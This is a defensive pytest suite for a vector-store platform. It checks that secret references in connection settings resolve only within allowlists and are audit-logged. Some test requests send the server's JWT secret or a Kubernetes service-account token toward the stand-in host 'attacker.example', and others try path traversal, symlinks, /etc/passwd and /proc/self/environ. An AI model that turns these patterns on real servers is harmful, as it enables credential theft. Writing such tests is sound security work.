"""F1 / plan §0.1 (ADR 0003): ``*_env`` / ``*_file`` secret references resolve
only inside an allowlist, never to the server's own credentials, and every
resolved or refused reference name is audit-logged (never its value)."""

from __future__ import annotations

import os

import pytest

from vecshield_platform.api import secrets
from vecshield_platform.api.config_store import ConfigStore
from vecshield_platform.api.secrets import (
    SecretReferenceDenied,
    SecretReferencePolicy,
    SecretResolutionError,
    resolve_conn,
)


@pytest.fixture(autouse=True)
def default_policy(monkeypatch):
    for name in ("VECSHIELD_SECRET_ENV_PREFIXES", "VECSHIELD_SECRET_ENV_ALLOW",
                 "VECSHIELD_SECRET_FILE_ROOTS"):
        monkeypatch.delenv(name, raising=False)


# --------------------------------------------------------------------------- #
# Environment references                                                      #
# --------------------------------------------------------------------------- #

@pytest.mark.parametrize("name", [
    "VECSHIELD_JWT_SECRET", "VECSHIELD_ADMIN_TOKEN", "CUSTOMER_API_TOKEN",
    "LOCAL_ADMIN_TOKEN", "VECSHIELD_INITIAL_ADMIN_PASSWORD",
    "VECSHIELD_OIDC_CLIENT_SECRET", "VECSHIELD_SCIM_TOKEN_SHA256",
    "VECSHIELD_SCIM_ANYTHING", "VECSHIELD_SMTP_PASSWORD",
])
def test_the_servers_own_secrets_are_never_resolvable(monkeypatch, name):
    monkeypatch.setenv(name, "super-secret-value")
    # Even when an operator allowlists the name exactly or by a wide prefix.
    monkeypatch.setenv("VECSHIELD_SECRET_ENV_ALLOW", name)
    monkeypatch.setenv("VECSHIELD_SECRET_ENV_PREFIXES", "VECSHIELD_,CUSTOMER_,LOCAL_")
    with pytest.raises(SecretReferenceDenied) as ei:
        resolve_conn({"api_key_env": name})
    message = str(ei.value)
    assert "super-secret-value" not in message
    assert "api_key_env" in message and "never" in message


def test_default_prefix_allows_store_namespace(monkeypatch):
    monkeypatch.setenv("VECSHIELD_STORE_QDRANT_KEY", "k1")
    assert resolve_conn({"api_key_env": "VECSHIELD_STORE_QDRANT_KEY"}) == {"api_key": "k1"}


def test_name_outside_prefix_is_refused_before_it_is_read(monkeypatch):
    monkeypatch.setenv("HOME_GROWN_KEY", "leak-me")
    with pytest.raises(SecretReferenceDenied) as ei:
        resolve_conn({"password_env": "HOME_GROWN_KEY"})
    msg = str(ei.value)
    assert "leak-me" not in msg
    assert "VECSHIELD_SECRET_ENV_PREFIXES" in msg and "VECSHIELD_SECRET_ENV_ALLOW" in msg
    # Refused names give the same answer whether or not they exist: no oracle.
    monkeypatch.delenv("HOME_GROWN_KEY")
    with pytest.raises(SecretReferenceDenied):
        resolve_conn({"password_env": "HOME_GROWN_KEY"})


def test_exact_allow_list_is_the_migration_path(monkeypatch):
    monkeypatch.setenv("QDRANT_KEY", "legacy")
    monkeypatch.setenv("VECSHIELD_SECRET_ENV_ALLOW", "PG_PASSWORD, QDRANT_KEY")
    assert resolve_conn({"api_key_env": "QDRANT_KEY"}) == {"api_key": "legacy"}
    # Exact, not a prefix: a longer name is still refused.
    monkeypatch.setenv("QDRANT_KEY_ADMIN", "x")
    with pytest.raises(SecretReferenceDenied):
        resolve_conn({"api_key_env": "QDRANT_KEY_ADMIN"})


def test_custom_prefixes(monkeypatch):
    monkeypatch.setenv("VECSHIELD_SECRET_ENV_PREFIXES", "ACME_VS_,OTHER_")
    monkeypatch.setenv("ACME_VS_PG", "pw")
    assert resolve_conn({"password_env": "ACME_VS_PG"}) == {"password": "pw"}
    monkeypatch.setenv("VECSHIELD_STORE_PG", "pw2")
    with pytest.raises(SecretReferenceDenied):  # the default no longer applies
        resolve_conn({"password_env": "VECSHIELD_STORE_PG"})


def test_empty_prefix_setting_allows_nothing(monkeypatch):
    monkeypatch.setenv("VECSHIELD_SECRET_ENV_PREFIXES", "")
    monkeypatch.setenv("VECSHIELD_STORE_PG", "pw")
    with pytest.raises(SecretReferenceDenied):
        resolve_conn({"password_env": "VECSHIELD_STORE_PG"})


# --------------------------------------------------------------------------- #
# File references                                                             #
# --------------------------------------------------------------------------- #

@pytest.fixture
def secret_root(tmp_path, monkeypatch):
    root = tmp_path / "secrets"
    root.mkdir()
    (root / "pg").write_text("pg-pw\n")
    monkeypatch.setenv("VECSHIELD_SECRET_FILE_ROOTS", str(root))
    return root


def test_file_under_allowed_root_resolves(secret_root):
    assert resolve_conn({"password_file": str(secret_root / "pg")}) == {"password": "pg-pw"}


def test_default_root_refuses_arbitrary_files(tmp_path, monkeypatch):
    monkeypatch.delenv("VECSHIELD_SECRET_FILE_ROOTS", raising=False)
    f = tmp_path / "x"
    f.write_text("nope")
    with pytest.raises(SecretReferenceDenied, match="/run/secrets/vecshield/"):
        resolve_conn({"password_file": str(f)})
    with pytest.raises(SecretReferenceDenied):
        resolve_conn({"password_file": "/etc/passwd"})


def test_dotdot_escape_is_refused(secret_root, tmp_path):
    outside = tmp_path / "outside"
    outside.write_text("private")
    sneaky = os.path.join(str(secret_root), "..", "outside")
    with pytest.raises(SecretReferenceDenied, match="symlinks and '..'"):
        resolve_conn({"password_file": sneaky})


#: Why a platform credential path such as the Kubernetes service-account token
#: is refused. These are POSIX paths: on Windows they have no drive, so they
#: are refused earlier, as not absolute. Refused either way.
PLATFORM_PATH_REFUSAL = "platform credential" if os.name == "posix" else "absolute path"

def test_symlink_escape_is_refused(secret_root, tmp_path):
    outside = tmp_path / "outside"
    outside.write_text("private")
    link = secret_root / "link"
    link.symlink_to(outside)
    with pytest.raises(SecretReferenceDenied):
        resolve_conn({"password_file": str(link)})


def test_relative_paths_are_refused(secret_root):
    with pytest.raises(SecretReferenceDenied, match="absolute"):
        resolve_conn({"password_file": "pg"})


@pytest.mark.parametrize("path", [
    "/var/run/secrets/kubernetes.io/serviceaccount/token",
    "/run/secrets/kubernetes.io/serviceaccount/token",
    "/var/run/secrets/eks.amazonaws.com/serviceaccount/token",
    "/proc/self/environ",
])
def test_platform_credentials_are_refused_even_if_allowlisted(monkeypatch, path):
    monkeypatch.setenv("VECSHIELD_SECRET_FILE_ROOTS", "/var/run/secrets,/run/secrets,/proc")
    with pytest.raises(SecretReferenceDenied, match=PLATFORM_PATH_REFUSAL):
        resolve_conn({"password_file": path})


def test_missing_file_inside_root_is_a_plain_resolution_error(secret_root):
    with pytest.raises(SecretResolutionError) as ei:
        resolve_conn({"password_file": str(secret_root / "absent")})
    assert not isinstance(ei.value, SecretReferenceDenied)


def test_policy_from_env_parses_lists():
    p = SecretReferencePolicy.from_env({
        "VECSHIELD_SECRET_ENV_PREFIXES": " A_, B_ ,",
        "VECSHIELD_SECRET_ENV_ALLOW": "X,Y",
        "VECSHIELD_SECRET_FILE_ROOTS": "/r1,/r2/"})
    assert p.env_prefixes == ("A_", "B_")
    assert p.env_allow == frozenset({"X", "Y"})
    assert p.file_roots == ("/r1", "/r2/")


def test_reference_names_lists_names_not_values():
    conn = {"host": "db", "password_env": "VECSHIELD_STORE_PG", "api_key_file": "/f",
            "password": "raw"}
    assert secrets.reference_names(conn) == {"api_key_file": "/f",
                                             "password_env": "VECSHIELD_STORE_PG"}


# --------------------------------------------------------------------------- #
# ConfigStore: refused at save time, legacy configs load as unavailable       #
# --------------------------------------------------------------------------- #

def test_config_store_refuses_a_denied_reference_at_save(tmp_path):
    cfg = ConfigStore(str(tmp_path / "c.json"))
    with pytest.raises(SecretReferenceDenied):
        cfg.add_store("q", "qdrant", conn={"url": "https://x", "api_key_env": "VECSHIELD_JWT_SECRET"})
    assert "q" not in cfg.stores
    cfg.add_store("q", "qdrant", conn={"url": "https://x",
                                       "api_key_env": "VECSHIELD_STORE_Q"})
    with pytest.raises(SecretReferenceDenied):
        cfg.update_store("q", kind="qdrant",
                         conn={"url": "https://x",
                               "api_key_file": "/var/run/secrets/kubernetes.io/serviceaccount/token"})
    assert cfg.stores["q"].conn["api_key_env"] == "VECSHIELD_STORE_Q"


def test_legacy_reference_loads_as_unavailable_with_a_migration_warning(
        tmp_path, monkeypatch, caplog):
    import json
    path = tmp_path / "c.json"
    path.write_text(json.dumps({"stores": [
        {"store_id": "old", "kind": "pinecone", "conn": {"api_key_env": "PINECONE_KEY"}},
        {"store_id": "fine", "kind": "chroma", "conn": {"path": str(tmp_path / "db")}},
    ]}))
    monkeypatch.setenv("PINECONE_KEY", "value")
    with caplog.at_level("WARNING"):
        reg = ConfigStore(str(path)).build_registry()
    assert reg.get("fine").unavailable is None
    reason = reg.get("old").unavailable
    assert reason and "PINECONE_KEY" in reason and "value" not in reason
    assert any("VECSHIELD_SECRET_ENV_ALLOW" in r.getMessage() for r in caplog.records)
    # Allowing the exact name is enough to bring it back.
    monkeypatch.setenv("VECSHIELD_SECRET_ENV_ALLOW", "PINECONE_KEY")
    assert ConfigStore(str(path)).build_registry().get("old").unavailable is None


# --------------------------------------------------------------------------- #
# API: the exploit from §0.1, and the audit trail                             #
# --------------------------------------------------------------------------- #

pytest.importorskip("fastapi")
from fastapi.testclient import TestClient  # noqa: E402

from vecshield_platform.api import create_app  # noqa: E402
from vecshield_platform.compliance import AuditLog  # noqa: E402


@pytest.fixture
def api(tmp_path, monkeypatch):
    monkeypatch.setenv("VECSHIELD_JWT_SECRET", "jwt-signing-secret")
    cfg = ConfigStore(str(tmp_path / "c.json"))
    log = AuditLog()
    app = create_app(config_store=cfg, audit_log=log, serve_ui=False,
                     auth_token="read-tok", admin_token="admin-tok")
    yield TestClient(app), cfg, log
    app.state.jobs.shutdown(wait=False)


ADMIN = {"Authorization": "Bearer admin-tok"}


def test_test_connection_cannot_exfiltrate_the_jwt_secret(api):
    c, _, log = api
    r = c.post("/admin/stores/test-connection", headers=ADMIN, json={
        "kind": "qdrant", "conn": {"url": "https://attacker.example",
                                   "api_key_env": "VECSHIELD_JWT_SECRET"}})
    assert r.status_code == 422
    assert "jwt-signing-secret" not in r.text
    assert "never be used as a store secret" in r.json()["detail"]
    refused = [e for e in log.entries if e.action == "secret_reference_refused"]
    assert refused and refused[-1].details["secret_refs"] == {
        "api_key_env": "VECSHIELD_JWT_SECRET"}
    assert refused[-1].details["operation"] == "store_connection_test"


def test_test_connection_cannot_read_the_service_account_token(api):
    c, _, _ = api
    r = c.post("/admin/stores/test-connection", headers=ADMIN, json={
        "kind": "pgvector", "conn": {
            "host": "attacker.example",
            "password_file": "/var/run/secrets/kubernetes.io/serviceaccount/token"}})
    assert r.status_code == 422
    assert PLATFORM_PATH_REFUSAL in r.json()["detail"]


def test_add_store_with_denied_reference_is_422_and_not_saved(api):
    c, cfg, log = api
    r = c.post("/admin/stores", headers=ADMIN, json={
        "store_id": "x", "kind": "qdrant",
        "conn": {"url": "https://attacker.example", "api_key_env": "CUSTOMER_API_TOKEN"}})
    assert r.status_code == 422
    assert "x" not in cfg.stores
    assert log.entries[-1].action == "secret_reference_refused"


def test_resolved_reference_names_are_audited(api, monkeypatch, tmp_path):
    c, cfg, log = api
    monkeypatch.setenv("VECSHIELD_STORE_CHROMA_TOKEN", "tok-value")
    r = c.post("/admin/stores", headers=ADMIN, json={
        "store_id": "s", "kind": "qdrant",
        "conn": {"url": "http://127.0.0.1:9", "api_key_env": "VECSHIELD_STORE_CHROMA_TOKEN"}})
    assert r.status_code == 200, r.text
    added = [e for e in log.entries if e.action == "store_added"][-1]
    assert added.details["secret_refs"] == {"api_key_env": "VECSHIELD_STORE_CHROMA_TOKEN"}
    assert "tok-value" not in str(added.details)
    r = c.put("/admin/stores/s", headers=ADMIN, json={
        "kind": "qdrant",
        "conn": {"url": "http://127.0.0.1:9", "api_key_env": "VECSHIELD_STORE_CHROMA_TOKEN"}})
    assert r.status_code == 200, r.text
    updated = [e for e in log.entries if e.action == "store_updated"][-1]
    assert updated.details["secret_refs"] == {"api_key_env": "VECSHIELD_STORE_CHROMA_TOKEN"}
    r = c.post("/admin/stores/test-connection", headers=ADMIN, json={
        "kind": "qdrant", "conn": {"url": "http://127.0.0.1:9",
                                   "api_key_env": "VECSHIELD_STORE_CHROMA_TOKEN"}})
    assert r.status_code == 200
    tested = [e for e in log.entries if e.action == "store_connection_tested"][-1]
    assert tested.details["secret_refs"] == {"api_key_env": "VECSHIELD_STORE_CHROMA_TOKEN"}
    assert "tok-value" not in str(tested.details)
